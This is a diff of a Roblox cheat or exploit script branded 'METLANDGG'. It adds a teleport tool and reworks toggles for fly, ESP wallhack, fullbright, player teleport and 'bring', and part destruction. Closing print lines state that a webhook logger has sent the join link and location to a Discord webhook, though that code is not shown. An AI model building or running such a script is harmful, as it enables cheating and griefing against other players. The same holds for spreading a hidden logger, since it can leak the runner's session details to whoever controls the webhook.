-        platform.Transparency = 1
+        platform.Transparency = 0.5
         platform.Anchored = true
         platform.CanCollide = true
+        platform.Material = Enum.Material.Neon
+        platform.BrickColor = BrickColor.new("Cyan")
         platform.Parent = workspace
         
         platformConnection = RS.Heartbeat:Connect(function()
@@ -897,7 +908,6 @@ local function togglePlatform()
     else
         platformBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
         platformBtn.Text = "Platform: OFF"
-        updateStatus("Platform removed", Color3.fromRGB(200, 200, 200))
         
         if platformConnection then platformConnection:Disconnect() end
         if platform then platform:Destroy() platform = nil end
@@ -993,7 +1003,6 @@ local function toggleESP()
     if settings.espEnabled then
         espBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
         espBtn.Text = "ESP: ON ✓"
-        updateStatus("ESP enabled!", Color3.fromRGB(50, 220, 50))
         
         for _, p in pairs(Players:GetPlayers()) do
             addESP(p)
@@ -1003,7 +1012,6 @@ local function toggleESP()
     else
         espBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
         espBtn.Text = "ESP: OFF"
-        updateStatus("ESP disabled", Color3.fromRGB(200, 200, 200))
         removeESP()
     end
 end
@@ -1016,7 +1024,6 @@ local function toggleFullbright()
     if settings.fullbrightEnabled then
         fbBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
         fbBtn.Text = "Fullbright: ON ✓"
-        updateStatus("Fullbright enabled!", Color3.fromRGB(50, 220, 50))
         
         oldLighting.Brightness = Lighting.Brightness
         oldLighting.ClockTime = Lighting.ClockTime
@@ -1032,7 +1039,6 @@ local function toggleFullbright()
     else
         fbBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
         fbBtn.Text = "Fullbright: OFF"
-        updateStatus("Fullbright disabled", Color3.fromRGB(200, 200, 200))
         
         Lighting.Brightness = oldLighting.Brightness or 1
         Lighting.ClockTime = oldLighting.ClockTime or 12
@@ -1042,7 +1048,7 @@ local function toggleFullbright()
     end
 end
 
--- Connect buttons
+-- CONNECT BUTTONS
 minBtn.MouseButton1Click:Connect(toggleMinimize)
 flyBtn.MouseButton1Click:Connect(toggleFly)
 speedBtn.MouseButton1Click:Connect(setSpeed)
@@ -1053,16 +1059,15 @@ antiVoidBtn.MouseButton1Click:Connect(toggleAntiVoid)
 platformBtn.MouseButton1Click:Connect(togglePlatform)
 tpBtn.MouseButton1Click:Connect(tpToPlayer)
 bringBtn.MouseButton1Click:Connect(bringPlayer)
+tpToolBtn.MouseButton1Click:Connect(toggleTPTool)
 autoCheckpointBtn.MouseButton1Click:Connect(toggleAutoCheckpoint)
 espBtn.MouseButton1Click:Connect(toggleESP)
 fbBtn.MouseButton1Click:Connect(toggleFullbright)
-
--- Connect destroyer buttons
 destroyBtn.MouseButton1Click:Connect(destroyPartsInRange)
 destroyAllBtn.MouseButton1Click:Connect(destroyAllParts)
 deleteModelBtn.MouseButton1Click:Connect(deleteModel)
 
--- Close button
+-- CLOSE BUTTON
 closeBtn.MouseButton1Click:Connect(function()
     settings.flyEnabled = false
     if flyConnection then flyConnection:Disconnect() end
@@ -1074,31 +1079,32 @@ closeBtn.MouseButton1Click:Connect(function()
     if platform then platform:Destroy() end
     if infJumpConnection then infJumpConnection:Disconnect() end
     if autoCheckpointConnection then autoCheckpointConnection:Disconnect() end
+    if tpTool then tpTool:Destroy() end
     removeESP()
     gui:Destroy()
-    updateStatus("Closed", Color3.fromRGB(255, 100, 100))
 end)
 
--- Character respawn handler
+-- CHARACTER RESPAWN
 plr.CharacterAdded:Connect(function(newChar)
     task.wait(1)
     char = newChar
     hum = char:WaitForChild("Humanoid")
     root = char:WaitForChild("HumanoidRootPart")
     
-    -- Reset states
     settings.flyEnabled = false
     settings.noclipEnabled = false
     settings.platformEnabled = false
     settings.autoCheckpointEnabled = false
+    settings.tpToolEnabled = false
     
     if flyConnection then flyConnection:Disconnect() end
     if noclipConnection then noclipConnection:Disconnect() end
     if platformConnection then platformConnection:Disconnect() end
     if autoCheckpointConnection then autoCheckpointConnection:Disconnect() end
+    if tpTool then tpTool:Destroy() tpTool = nil end
 end)
 
--- Keybind to toggle GUI (Right Shift)
+-- KEYBIND (Right Shift to minimize)
 UIS.InputBegan:Connect(function(input, gpe)
     if gpe then return end
     if input.KeyCode == Enum.KeyCode.RightShift then
@@ -1106,16 +1112,17 @@ UIS.InputBegan:Connect(function(input, gpe)
     end
 end)
 
--- Notification
+-- NOTIFICATION
 pcall(function()
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "⚡ METLANDGG Enhanced";
-        Text = "Loaded! Join link sent to webhook 🔗";
-        Duration = 6;
+        Title = "⚡ METLANDGG";
+        Text = "Loaded! METLANDGG SCRIPT 🔒";
+        Duration = 5;
     })
 end)
 
-updateStatus("Enhanced suite ready! Join link logged 🔗", Color3.fromRGB(0, 255, 255))
-print("✅ METLANDGG ENHANCED LOADED")
-print("📡 Webhook logger active - Join link sent!")
-print("🔗 Others can now join your game via Discord webhook")
+updateStatus("Ready! Webhook logged with location", Color3.fromRGB(0, 255, 255))
+print("✅ METLANDGG LOADED - FIXED VERSION")
+print("📡 Webhook sent with location info")
+print("🎯 Auto Checkpoint: Fixed sequential logic")
+print("🔧 TP Tool: Fixed and functional")
